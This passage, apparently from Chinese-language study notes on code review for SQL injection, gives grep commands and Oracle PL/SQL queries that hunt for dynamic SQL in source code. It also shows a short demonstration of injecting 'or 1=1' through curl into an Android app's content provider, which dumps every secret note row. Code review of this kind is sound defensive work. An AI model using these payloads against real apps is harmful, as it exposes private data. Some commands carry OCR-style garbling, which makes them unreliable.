string">"HttpCookieCollection\|Form\|Headers\|Params\|QuerySt ring\|Servervariables\|Url\|UserAgent\|UserHostAddress\|UserHostName"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="复查Android应用程序代码"><a href="#复查Android应用程序代码" class="headerlink" title="复查Android应用程序代码"></a>复查Android应用程序代码</h4><h5 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h5><p><a href="http://labs.mwrinfosecurity.com/tools/android_webcontentresolver/">WebContentResolver</a>，它可以运行在Android设备(或模拟器)上，并向 所有已安装的内容提供程序暴露Web Service接口。</p><p>dex2jar这样的工具可以轻而易举地将Android应用程序的包文件(APK) 转换为Java Archive (JAR)文件。然后，可以采用某种Java反汇编程序 比如jdgui或 jad,反编译应用程序并查看源代码。</p><h5 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h5><p>Android开发人员使用两个类与SQLite数据库进行交互：<code>SQLiteQueryBuilder</code>类和 <code>SQLiteDatabase</code>类。<code>android.database.sqlite.SQLiteQueryBuilder</code> 是一个便捷类，用于创建发送给SQLiteDatabase对象的SQL查询<code>android.database.sqlite.SQLiteDatabase</code> 类 则提供了用于管理 SQLite 数据库的各种方法。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//android.database.sqlite.SQLiteQueryBuilder</span><span class="token comment">//构造一条SELECT语句，该语句适合作为buildUnionQuery中通过UNION操作符连接的语句组中的SELECT语句</span><span class="token function">buildQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projectionIn<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span><span class="token comment">//用指定的子句构造一个SQL查询字符串</span><span class="token function">buildQueryString</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> distinct<span class="token punctuation">,</span> <span class="token class-name">String</span> tables<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name"><span class="token namespace">columns<span class="token punctuation">.</span></span> String</span> <span class="token class-name"><span class="token namespace">where<span class="token punctuation">.</span></span> String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> orderBy<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span> <span class="token comment">//给定一组子查询，其中每一个都是SELECT语句，构造一个union所有这些子查询返回结果的查询 </span><span class="token function">buildUnionQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> subQueries<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span><span class="token comment">//构造一条SELECT语句，该语句适合作为buildUnionQuery中通过UNION操作符连接的语句组中的SELECT语句</span><span class="token function">buildUnionSubQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeDiscriminatorColumn<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> unionColumns<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> columnsPresentInTable<span class="token punctuation">,</span> <span class="token keyword">int</span> computedColumnsOffset<span class="token punctuation">,</span> <span class="token class-name">String</span> typeDiscriminatorValue<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">)</span><span class="token comment">//结合所有当前设置和传递给该方法的信息，这些一个查询</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase</span> db<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projectionin<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span><span class="token comment">//android.database.sqlite.SQLiteDatabase</span><span class="token comment">//在数据库中删除行的简便方法</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">)</span><span class="token comment">//执行单个SQL语句，该SQL语句既不是SELECT语句，也不是任何其他返回数据的SQL语句 </span><span class="token function">execSQL</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">)</span><span class="token comment">//执行单个SQL语句，该SQL语句不是SELECT/INSERT/UPDATE/DELETE语句</span><span class="token function">execSQL</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">sql<span class="token punctuation">.</span></span> Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bindArgs<span class="token punctuation">)</span><span class="token comment">//向数据库插入一行数据的便捷方法</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span><span class="token class-name">Contentvalues</span> values<span class="token punctuation">)</span><span class="token comment">//向数据库插入一行数据的便捷方法</span><span class="token function">insertOrThrow</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span><span class="token class-name">Contentvalues</span> values<span class="token punctuation">)</span><span class="token comment">//向数据库插入一行数据的通用方法</span><span class="token function">insertWithOnConflict</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialvalues<span class="token punctuation">,</span> <span class="token keyword">int</span> conflictAlgorithm<span class="token punctuation">)</span><span class="token comment">//查询指定的表，返回结果集上的一个游标(Cursor)</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> columns<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> orderBy<span class="token punctuation">,</span><span class="token class-name">String</span> limit<span class="token punctuation">)</span><span class="token comment">//查询指定的URL,返回结果集上的一个游标</span><span class="token function">queryWithFactory</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase<span class="token punctuation">.</span>CursorFactory</span> cursorFactory<span class="token punctuation">,</span> <span class="token keyword">boolean</span> distinct<span class="token punctuation">,</span> <span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> columns<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">selection<span class="token punctuation">.</span></span> String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">having<span class="token punctuation">.</span></span> String</span> orderBy<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span> <span class="token comment">//运行指定的SQL语句，返回结果集上的一个游标</span><span class="token function">rawQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">)</span><span class="token comment">//运行指定的SQL语句，返回结果集上的一个游标</span><span class="token function">rawQueryWithFactory</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase<span class="token punctuation">.</span>CursorFactory</span> cursorFactory<span class="token punctuation">,</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> editTable<span class="token punctuation">)</span><span class="token comment">//替换数据库中数据行的便捷方法</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialvalues<span class="token punctuation">)</span> <span class="token comment">//替换数据库中数据行的便捷方法</span><span class="token function">replaceOrThrow</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialValues<span class="token punctuation">)</span><span class="token comment">//更新数据库中数据行的便捷方法</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> values<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">)</span><span class="token comment">//更新数据库中数据行的便捷方法</span><span class="token function">updateWithOnConflict</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> values<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">,</span> <span class="token keyword">int</span> conflictAlgorithm<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="跟踪数据-1"><a href="#跟踪数据-1" class="headerlink" title="跟踪数据"></a>跟踪数据</h5><p>通过shell命令在源文件中查找上述类方法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"delete(\|execSQL(\|insert(\|insertOrThrow(\|insertWithO nConflict(\|query(\|queryWithFactory(\|rawQuery(\|rawQueryWithFacto ry(\|replace(\|replaceOrThrow(\|update(\丨 updateWithOnConflict(\|buildQuery(\|buildQueryString(\|buildUnionQuery(\|buildUnionSubQuery(\ | query("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索包含动态SQL语句的字符串</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"String.*=.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'(print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ svn checkout http://android-sap-note-viewer.googlecode.com/svn/trunk/sap-note-viewer$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"delete(\|execSQL(\|insert(\|insertOrThrow(\|insertWithOnConflict(\|query(\|queryWithFactory(\|rawQuery(\|rawQueryWithFactory(\|replace(\|replaceOrThrow(\|update(\|updateWithOnConflict(\|buildQuery(\|buildQueryString(\|buildUnionQuery(\|buildUnionSubQuery(\ | query("</span> sap-note-viewer/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print nfilename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>filename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.javaline: <span class="token number">106</span>match: public Cursor query<span class="token punctuation">(</span>Uri uri, String<span class="token punctuation">[</span><span class="token punctuation">]</span> projection, String selection, String<span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs, String sortOrder<span class="token punctuation">)</span> <span class="token punctuation">{</span>filename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.javaline: <span class="token number">121</span>match: Cursor c <span class="token operator">=</span> qBuilder.query<span class="token punctuation">(</span>db, projection, selection, selectionArgs, null, null, sortOrder<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Cursor</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">Uri</span> uri<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projection<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">SQLiteQueryBuilder</span> qBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLiteQueryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qBuilder<span class="token punctuation">.</span><span class="token function">setTables</span><span class="token punctuation">(</span><span class="token constant">DATABASE_TABLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果搜索为空，就添加一个通配符，在内容之前和之后添加通配符</span><span class="token keyword">if</span><span class="token punctuation">(</span>selectionArgs<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"%"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>selectionArgs<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>selectionArgs <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span>selectionArgs <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//将内部字段映射到SearchManager理解的字段</span>qBuilder<span class="token punctuation">.</span><span class="token function">setProjectionMap</span><span class="token punctuation">(</span><span class="token constant">NOTE_PROJECTION_MAP</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SQLiteDatabase</span> db <span class="token operator">=</span> dbHelper<span class="token punctuation">.</span><span class="token function">getReadableDatabase</span><span class="token punctuation">(</span>〉；<span class="token comment">//执行査询</span><span class="token class-name">Cursor</span> c <span class="token operator">=</span> qBuilder<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>db<span class="token punctuation">,</span> projection<span class="token punctuation">,</span> selection<span class="token punctuation">,</span> selectionArgs<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> sortOrder<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>WebContentResolver向所有己经安装的内容提供程序(Content-Provider)暴露了一个Web Service接口。可以用WebContentResolver实用工具列出所有可访问的内容提供程序。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8080/listpackage: org.sapmentors.sapnoteviewauthority: org.sapmentors.sapnoteview.noteproviderexported: <span class="token boolean">true</span>readPerm: nullwritePerm: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行查询</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8080/query?a<span class="token operator">=</span>org.sapmentors.sapnoteview.noteprovider?<span class="token operator">&amp;</span><span class="token assign-left variable">selName</span><span class="token operator">=</span>_id<span class="token operator">&amp;</span><span class="token assign-left variable">seiId</span><span class="token operator">=</span><span class="token number">11223</span>Query successful:Column count: <span class="token number">3</span>Row count: <span class="token number">1</span>I_id <span class="token operator">|</span> suggest_text_l <span class="token operator">|</span> suggest_intent_dataI <span class="token number">11223</span> <span class="token operator">|</span> secret text 丨 <span class="token number">11223</span><span class="token comment">#实际SQL语句</span><span class="token comment">#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行注入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$curl</span> http://127.0.0.1:8080/query?a<span class="token operator">=</span>org.sapmentors.sapnoteview, noteprovider?<span class="token operator">&amp;</span><span class="token assign-left variable">selName</span><span class="token operator">=</span>_id<span class="token operator">&amp;</span><span class="token assign-left variable">selId</span><span class="token operator">=</span>l1223%20or%201<span class="token operator">=</span><span class="token number">1</span>Query successful:Column count: <span class="token number">3</span>Row count: <span class="token number">4</span><span class="token operator">|</span> _id <span class="token operator">|</span> suggest_text_l <span class="token operator">|</span>suggest_intent_data<span class="token operator">|</span> <span class="token number">11223</span> <span class="token operator">|</span> secret text <span class="token operator">|</span> <span class="token number">11223</span><span class="token operator">|</span> <span class="token number">12345</span> <span class="token operator">|</span> secret text <span class="token operator">|</span> <span class="token number">12345</span><span class="token operator">|</span> <span class="token number">54321</span> <span class="token operator">|</span> super secret text <span class="token operator">|</span> <span class="token number">54321</span><span class="token operator">|</span> <span class="token number">98765</span> <span class="token operator">|</span> shhhh secret <span class="token operator">|</span> <span class="token number">98765</span><span class="token comment">#实际SQL语句</span><span class="token comment">#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223 or 1=1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>selName和selId这两个参数易感染，存在SQL注入</p><h4 id="复查PL-SQL和T-SQL代码"><a href="#复查PL-SQL和T-SQL代码" class="headerlink" title="复查PL/SQL和T-SQL代码"></a>复查PL/SQL和T-SQL代码</h4><h5 id="PL-SQL"><a href="#PL-SQL" class="headerlink" title="PL/SQL"></a>PL/SQL</h5><p>Oracle一直深受多种PL/SQL注入漏洞的困扰，这些漏洞位于数据库产品默认安装的内置数据库包的代码中。PL/SQL代码以definer权限执行，是提升权限的攻击者攻击对象。</p><p>存储过程既能够以调用者权限(authid current_user)运行，也能够以存储过程所有者权限 (authid definer)运行。创建存储过程时，可以使用authid子句指定该行为。</p><p>要分析PL/SQL有两种选择</p><h6 id="一种是将源代码从数据库导出来"><a href="#一种是将源代码从数据库导出来" class="headerlink" title="一种是将源代码从数据库导出来"></a>一种是将源代码从数据库导出来</h6><p>可以使用dbms_metadata包实现该目标，可以使用下面SQL*Plus脚本将DDL(Data Definition Language,数据定义语言)语句从Oracle数据库导出来。DDL语句是定义或修改数据结构(比如 表)的SQL语句。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Purpose: A PL/SQL script to export the DDL code for all database objects ——Version: v 0.0.1</span><span class="token comment">-- Works against: Oracle 9i, lOg and llg</span><span class="token comment">-- Author: Alexander Kornbrust of Red-Database-Security GmbH</span><span class="token keyword">set</span> echo <span class="token keyword">off</span> feed <span class="token keyword">off</span> pages <span class="token number">0</span> trims <span class="token keyword">on</span> term <span class="token keyword">on</span> trim <span class="token keyword">on</span> linesize <span class="token number">255</span> long <span class="token number">500000</span> head <span class="token keyword">off</span><span class="token comment">--</span><span class="token keyword">execute</span> DBMS_METADATA<span class="token punctuation">.</span>SET_TRANSFORM_PARAM<span class="token punctuation">(</span>DBMS_METADATA<span class="token punctuation">.</span>SESSION_TRANSFORM<span class="token punctuation">,</span> <span class="token string">'STORAGE'</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>spool getallunwrapped<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token keyword">select</span> <span class="token string">'spool ddl_source_unwrapped.txt'</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span class="token comment">-- create a SQL scripts containing all unwrapped objects</span><span class="token keyword">select</span> <span class="token string">'select dbms_metadata.get_ddl('''</span><span class="token operator">||</span>object_type<span class="token operator">||</span><span class="token string">''','''</span><span class="token operator">||</span>object_name<span class="token operator">||</span><span class="token string">''','''</span><span class="token operator">||</span>owner<span class="token operator">||</span><span class="token string">''') from dual;'</span><span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_objects <span class="token keyword">where</span> object_id <span class="token operator">not</span> <span class="token operator">in</span><span class="token punctuation">(</span><span class="token keyword">select</span> o<span class="token punctuation">.</span>obj<span class="token comment"># from source$ s, obj$ o,user$ u where ((lower(s.source) like '%function%wrapped%') or (lower (s.source) like '%procedure%wrapped%') or (lower(s.source) like '%package%wrapped%')) and o.obj#=s .obj# and u.user#=o.owner#)) where object_type in ('FUNCTION','PROCEDURE', 'PACKAGE', 'TRIGGER')</span><span class="token operator">and</span> owner <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'SYS'</span><span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> owner<span class="token punctuation">,</span>object_type<span class="token punctuation">,</span>object_name<span class="token punctuation">;</span><span class="token comment">-- spool a spool off into the spool file.</span><span class="token keyword">select</span> <span class="token string">'spool off'</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>spool <span class="token keyword">off</span><span class="token comment">--</span><span class="token comment">-- generate the DDL_source</span><span class="token variable">@getallunwrapped.sql</span>quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="另一种是构造自己的SQL语句来搜索PL-SQL代码"><a href="#另一种是构造自己的SQL语句来搜索PL-SQL代码" class="headerlink" title="另一种是构造自己的SQL语句来搜索PL/SQL代码"></a>另一种是构造自己的SQL语句来搜索PL/SQL代码</h6><p>Oracle在 ALL_SOURCE和DBA_SOURCE视图中存储PL/SQL源代码。可以通过访问两个视图之一的TEXT列实现该目的。最值得关注的是使用了execute immediate或dbms sql函数的代码。Oracle的PL/SQL是区分大小写的，一定要在查询中使用lower(text)函数，它会将文本值转换为小写字母以便LIKE语句能匹配所有可能的情况。</p><p>使用下列SQL语句来获取PL/SQL代码的源</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner <span class="token keyword">AS</span> Owner<span class="token punctuation">,</span> name <span class="token keyword">AS</span> Name<span class="token punctuation">,</span> <span class="token keyword">type</span> <span class="token keyword">AS</span> <span class="token keyword">Type</span><span class="token punctuation">,</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">WHERE</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>LOWER<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token string">'%immediate%'</span><span class="token punctuation">)</span> <span class="token operator">OR</span> <span class="token punctuation">(</span>LOWER<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token string">'%dbms_sql'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">AND</span> owner<span class="token operator">=</span> <span class="token string">'PLSQL'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/840f9086a329bf41df56550583bdcb36.png"></p><p>这三条语句易受到攻击，未验证的参数传给了危险的函数</p><p>寻找参数复制给局部定义的变量</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner <span class="token keyword">AS</span> Owner<span class="token punctuation">,</span> name <span class="token keyword">AS</span> Name<span class="token punctuation">,</span> <span class="token keyword">type</span> <span class="token keyword">AS</span> <span class="token keyword">Type</span><span class="token punctuation">,</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">where</span> lower<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%:=%||%''%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/d4fd03c14a6b885f11cfe09069f46727.png"></p><p>上述SQL语句找到了一个利用用户控制的数据动态创建SQL语句的包。我们有必要对该包做进一步审查，可以使用下列SQL语句追溯包(package)的源以便进一步审查其内容</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">WHERE</span> name<span class="token operator">=</span><span class="token string">'SP_STORED_PROCEDURE'</span> <span class="token operator">AND</span> owner<span class="token operator">=</span><span class="token string">'SYSMAN'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> line<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/268e43e5f0121d8c4c2fc627816da7d0.png"></p><p>input直接与SQL字符串相连，可以判断存在SQL注入</p><p>搜索数据库中所有的代码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Purpose: A PL/SQL script to search the DB for potentially vulnerable </span><span class="token comment">-- PL/SQL code</span>—<span class="token operator">-</span> Version: v <span class="token number">0.0</span><span class="token number">.1</span><span class="token comment">-- Works against: Oracle 9i, 10g and llg</span>——Author: Alexander Kornbrust <span class="token keyword">of</span> Red<span class="token operator">-</span><span class="token keyword">Database</span><span class="token operator">-</span>Security GmbH<span class="token keyword">select</span> <span class="token keyword">distinct</span> a<span class="token punctuation">.</span>owner<span class="token punctuation">,</span>a•name<span class="token punctuation">,</span>b<span class="token punctuation">.</span>authid<span class="token punctuation">,</span>a<span class="token punctuation">.</span><span class="token keyword">text</span> SQLTEXT <span class="token keyword">from</span> all_source a<span class="token punctuation">,</span>all_procedures b<span class="token keyword">where</span> <span class="token punctuation">(</span>lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%execute%immediate%(%||%)%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_sql%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%grant%to%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%alter%user%identified%by%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%execute%immediate%''%||%'</span><span 